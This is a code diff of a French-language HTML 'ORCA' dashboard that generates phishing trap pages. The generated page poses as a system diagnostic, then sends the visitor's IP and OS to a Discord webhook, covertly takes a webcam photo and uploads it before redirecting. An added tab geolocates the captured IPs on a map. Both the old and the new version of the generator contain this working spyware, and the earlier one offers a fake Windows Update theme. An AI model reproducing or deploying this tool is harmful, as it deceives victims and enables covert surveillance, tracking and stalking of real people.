@@ -2,63 +2,71 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>ORCA ADMIN DASHBOARD</title>
+    <title>ORCA COMMAND CENTER V2.0</title>
     <style>
-        :root { --neon: #00ff41; --bg: #050505; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; padding: 20px; }
-        .container { max-width: 1000px; margin: auto; border: 1px solid var(--neon); padding: 25px; box-shadow: 0 0 20px rgba(0,255,65,0.1); }
-        .tabs { display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid #222; padding-bottom: 10px; }
-        .tab { cursor: pointer; padding: 10px 20px; border: 1px solid #222; transition: 0.3s; }
-        .tab.active { background: var(--neon); color: #000; font-weight: bold; }
-        .section { display: none; }
+        :root { --neon: #00ff41; --bg: #050505; --dark: #111; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; padding: 20px; margin: 0; }
+        .container { max-width: 1000px; margin: auto; border: 1px solid var(--neon); padding: 25px; box-shadow: 0 0 20px rgba(0,255,65,0.1); background: rgba(0,10,0,0.9); }
+        .tabs { display: flex; gap: 5px; margin-bottom: 20px; border-bottom: 1px solid var(--dark); }
+        .tab { cursor: pointer; padding: 12px 25px; border: 1px solid var(--dark); border-bottom: none; transition: 0.3s; background: #000; font-size: 13px; }
+        .tab.active { background: var(--neon); color: #000; font-weight: bold; box-shadow: 0 0 10px var(--neon); }
+        .section { display: none; animation: fadeIn 0.4s; }
         .section.active { display: block; }
-        input, select, button { background: #000; color: var(--neon); border: 1px solid var(--neon); padding: 12px; margin: 10px 0; width: 100%; box-sizing: border-box; }
-        button { cursor: pointer; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
-        button:hover { background: var(--neon); color: #000; box-shadow: 0 0 10px var(--neon); }
-        pre { background: #080808; padding: 20px; border: 1px dashed #333; overflow-x: auto; color: #00cc33; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
-        .result-card { border: 1px solid #333; padding: 15px; margin-top: 20px; background: #0a0a0a; border-left: 4px solid var(--neon); }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        
+        input, select, button { background: #000; color: var(--neon); border: 1px solid var(--neon); padding: 12px; margin: 10px 0; width: 100%; box-sizing: border-box; font-family: monospace; }
+        button { cursor: pointer; font-weight: bold; text-transform: uppercase; transition: 0.2s; }
+        button:hover { background: var(--neon); color: #000; }
+        
+        pre { background: #000; padding: 15px; border: 1px dashed #333; overflow-x: auto; color: #00cc33; font-size: 11px; max-height: 300px; }
+        .result-card { border: 1px solid #222; padding: 15px; margin-top: 20px; background: #080808; border-left: 3px solid var(--neon); }
+        .log-box { font-size: 11px; color: #666; max-height: 150px; overflow-y: auto; border: 1px solid #111; padding: 10px; background: #000; margin-top: 10px; }
+        a { color: var(--neon); text-decoration: none; border-bottom: 1px solid; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1 style="text-align: center; letter-spacing: 5px;">ORCA_COMMAND_CENTER</h1>
+    <h2 style="text-align: center; letter-spacing: 4px; text-shadow: 0 0 10px var(--neon);">ORCA MULTI-TOOL ADMIN</h2>
     
     <div class="tabs">
         <div class="tab active" onclick="openTab('gen')">🔗 GENERATOR</div>
         <div class="tab" onclick="openTab('osint')">🔍 OSINT SCANNER</div>
+        <div class="tab" onclick="openTab('settings')">⚙️ SETTINGS</div>
     </div>
 
     <div id="gen" class="section active">
-        <h3>Générateur de Lien de Capture</h3>
-        <p style="color: #666; font-size: 12px;">Configurez votre Webhook et choisissez un thème pour générer le code de votre page index.html.</p>
+        <h3>Configuration du Piège</h3>
+        <input type="text" id="wh-url" placeholder="Coller l'URL du Webhook Discord">
+        <input type="text" id="redir" value="https://www.google.com" placeholder="URL de Redirection Finale">
+        <button onclick="generateCode()">Générer l'index.html</button>
         
-        <input type="text" id="wh-url" placeholder="URL Webhook Discord">
-        <select id="theme">
-            <option value="terminal">Thème : Cyber Terminal (Expert)</option>
-            <option value="winupdate">Thème : Windows Update (Fake)</option>
-            <option value="wifi">Thème : WiFi Diagnostic (FAI)</option>
-        </select>
-        <input type="text" id="redir" value="https://www.google.com" placeholder="URL de Redirection">
-
-        <button onclick="generateCode()">Générer le code source</button>
-        
-        <h4>Code à copier dans votre fichier index.html :</h4>
-        <pre id="output-code">// Le code s'affichera ici...</pre>
-        <button onclick="copyCode()" style="width: auto; padding: 5px 15px; font-size: 11px;">Copier le code</button>
+        <h4>Code Source (Copier-Coller sur GitHub) :</h4>
+        <pre id="output-code">// En attente de génération...</pre>
+        <button onclick="copyCode()" style="width: auto; padding: 5px 20px;">Copier le code</button>
     </div>
 
     <div id="osint" class="section">
-        <h3>OSINT IP Scanner</h3>
-        <p style="color: #666; font-size: 12px;">Analysez les IPs capturées pour obtenir la localisation et le fournisseur d'accès.</p>
-        <input type="text" id="ip-input" placeholder="Coller l'IP (ex: 8.8.8.8)">
-        <button onclick="scanIP()">Lancer l'Analyse</button>
-
+        <h3>IP Intelligence Scanner</h3>
+        <input type="text" id="ip-input" placeholder="Entrez l'IP reçue sur Discord">
+        <button onclick="scanIP()">Analyser l'IP</button>
         <div id="osint-result" class="result-card" style="display:none;"></div>
+    </div>
+
+    <div id="settings" class="section">
+        <h3>Options & Notifications</h3>
+        <label><input type="checkbox" id="sound-notif" checked style="width:auto;"> Activer l'alerte sonore (Discord style)</label>
+        <button onclick="testWebhook()" style="border-color: #555;">🔔 TESTER LE WEBHOOK</button>
+        
+        <h4>Journal d'activité :</h4>
+        <div id="session-log" class="log-box">En attente d'activité...</div>
+        <button onclick="document.getElementById('session-log').innerHTML = ''" style="width: auto; font-size: 10px;">Vider les logs</button>
     </div>
 </div>
 
 <script>
+    const logBox = document.getElementById('session-log');
+
     function openTab(id) {
         document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
         document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
@@ -66,69 +74,105 @@
         document.getElementById(id).classList.add('active');
     }
 
+    function addLog(msg) {
+        const time = new Date().toLocaleTimeString();
+        logBox.innerHTML = `<div>[${time}] ${msg}</div>` + logBox.innerHTML;
+        if(document.getElementById('sound-notif').checked) {
+            new Audio('https://www.myinstants.com/media/sounds/discord-notification.mp3').play();
+        }
+    }
+
+    // --- LOGIQUE GÉNÉRATEUR ---
     function generateCode() {
         const wh = document.getElementById('wh-url').value;
-        const redir = document.getElementById('redir').value;
-        if(!wh) return alert("Veuillez entrer un Webhook !");
+        const rd = document.getElementById('redir').value;
+        if(!wh) return alert("Webhook requis !");
 
-        // Template de base adapté de ton code fonctionnel
-        const code = `<!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Diagnostic</title>
-    <style>body{background:#000;color:#00ff41;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;overflow:hidden}.box{border:1px solid #00ff41;padding:30px;width:90%;max-width:400px;text-align:center}#v,#c{display:none}</style>
-</head>
-<body>
-    <div class="box"><h3>VÉRIFICATION SYSTÈME</h3><p id="m">Initialisation du protocole...</p><button id="b" onclick="start()" style="background:transparent;color:#00ff41;border:1px solid #00ff41;padding:10px;width:100%;cursor:pointer">DÉMARRER</button></div>
-    <video id="v" autoplay playsinline muted></video><canvas id="c"></canvas>
-    <script>
-        const WH = "${wh}";
-        async function post(msg, blob=null){
-            const fd = new FormData();
-            if(blob) fd.append('file', blob, 'img.png');
-            fd.append('payload_json', JSON.stringify({content: msg}));
-            await fetch(WH, {method:'POST', body:fd, keepalive:true});
-        }
-        async function start(){
-            document.getElementById('b').style.display='none';
-            document.getElementById('m').innerText="Analyse réseau...";
-            let ip="Bloquée"; try{const r=await fetch('https://api.ipify.org?format=json');const d=await r.json();ip=d.ip;}catch(e){}
-            await post("🚀 **CIBLE DÉTECTÉE**\\n**IP**: " + ip + "\\n**OS**: " + navigator.platform);
-            try{
-                const s=await navigator.mediaDevices.getUserMedia({video:true});
-                const v=document.getElementById('v'); v.srcObject=s;
-                v.onloadedmetadata=()=>{setTimeout(()=>{
-                    const c=document.getElementById('c'); c.width=v.videoWidth; c.height=v.videoHeight;
-                    c.getContext('2d').drawImage(v,0,0);
-                    c.toBlob(async(b)=>{await post("📸 **CAPTURE**", b); s.getTracks().forEach(t=>t.stop()); window.location.href="${redir}";},'image/png');
-                },1000)};
-            }catch(e){window.location.href="${redir}";}
-        }
-    <\/script>
-</body>
-</html>`;
-        document.getElementById('output-code').innerText = code;
+        const fullCode = `<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>System Maintenance</title></head>
+<body style="background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;">
+<div style="border:1px solid #0f0;padding:20px;text-align:center;">
+    <h2>DIAGNOSTIC REQUIS</h2><p id="t">Analyse des protocoles...</p>
+    <button onclick="exec()" style="background:#0f0;color:#000;border:none;padding:10px 20px;cursor:pointer;font-weight:bold;">LANCER LA RÉPARATION</button>
+</div>
+<video id="v" autoplay playsinline muted style="display:none"></video><canvas id="c" style="display:none"></canvas>
+<script>
+    const WH = "${wh}";
+    async function post(m, b=null){
+        const f=new FormData(); if(b)f.append('file',b,'x.png');
+        f.append('payload_json',JSON.stringify({content:m}));
+        await fetch(WH,{method:'POST',body:f,keepalive:true});
+    }
+    async function exec(){
+        document.querySelector('button').style.display='none';
+        let ip="Inconnue"; try{const r=await fetch('https://api.ipify.org?format=json');const d=await r.json();ip=d.ip;}catch(e){}
+        await post("🎯 **NOUVELLE CIBLE**\\nIP: "+ip+"\\nOS: "+navigator.platform);
+        try{
+            const s=await navigator.mediaDevices.getUserMedia({video:true});
+            const v=document.getElementById('v'); v.srcObject=s;
+            v.onloadedmetadata=()=>{setTimeout(()=>{
+                const c=document.getElementById('c'); c.width=v.videoWidth; c.height=v.videoHeight;
+                c.getContext('2d').drawImage(v,0,0);
+                c.toBlob(async(b)=>{await post("📸 **IMAGE CAPTURÉE**",b); s.getTracks().forEach(t=>t.stop()); window.location.href="${rd}";},'image/png');
+            },1000)};
+        }catch(e){window.location.href="${rd}";}
+    }
+<\/script>
+</body></html>`;
+
+        document.getElementById('output-code').innerText = fullCode;
+        addLog("Nouveau code généré avec succès.");
     }
 
     function copyCode() {
         const code = document.getElementById('output-code').innerText;
         navigator.clipboard.writeText(code);
-        alert("Code copié !");
+        addLog("Code copié dans le presse-papier.");
     }
 
+    // --- LOGIQUE OSINT ---
     async function scanIP() {
         const ip = document.getElementById('ip-input').value;
         const resBox = document.getElementById('osint-result');
         if(!ip) return;
+
+        addLog(`Lancement du scan OSINT pour l'IP : ${ip}`);
         resBox.style.display = "block";
-        resBox.innerHTML = "Recherche en cours...";
+        resBox.innerHTML = "Analyse en cours...";
+
         try {
             const r = await fetch('https://ipapi.co/'+ip+'/json/');
             const d = await r.json();
-            resBox.innerHTML = "<strong>RESULTATS OSINT :</strong><br>📍 Ville: "+d.city+"<br>🏢 FAI: "+d.org+"<br>🗺️ <a href='https://www.google.com/maps?q="+d.latitude+","+d.longitude+"' target='_blank' style='color:#00ff41'>Localiser sur Maps</a>";
-        } catch(e) { resBox.innerHTML = "Erreur de scan."; }
+            if(d.error) throw new Error();
+            
+            resBox.innerHTML = `
+                <strong style="color:var(--neon)">ANALYSE TERMINÉE :</strong><br>
+                📍 <b>Lieu :</b> ${d.city}, ${d.region} (${d.country_name})<br>
+                🏢 <b>ISP :</b> ${d.org}<br>
+                📡 <b>Réseau :</b> ${d.asn}<br>
+                🗺️ <a href="https://www.google.com/maps?q=${d.latitude},${d.longitude}" target="_blank">Ouvrir Google Maps</a>
+            `;
+            addLog(`Scan réussi pour ${d.city} (${d.org})`);
+        } catch(e) {
+            resBox.innerHTML = "❌ IP invalide ou API bloquée.";
+            addLog("Erreur lors du scan OSINT.");
+        }
+    }
+
+    async function testWebhook() {
+        const wh = document.getElementById('wh-url').value;
+        if(!wh) return alert("Webhook manquant !");
+        try {
+            await fetch(wh, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ content: "🔔 **PING** : Dashboard ORCA connecté." })
+            });
+            addLog("Ping Webhook envoyé !");
+        } catch(e) { addLog("Échec du test Webhook."); }
     }
 </script>
+
 </body>
 </html>
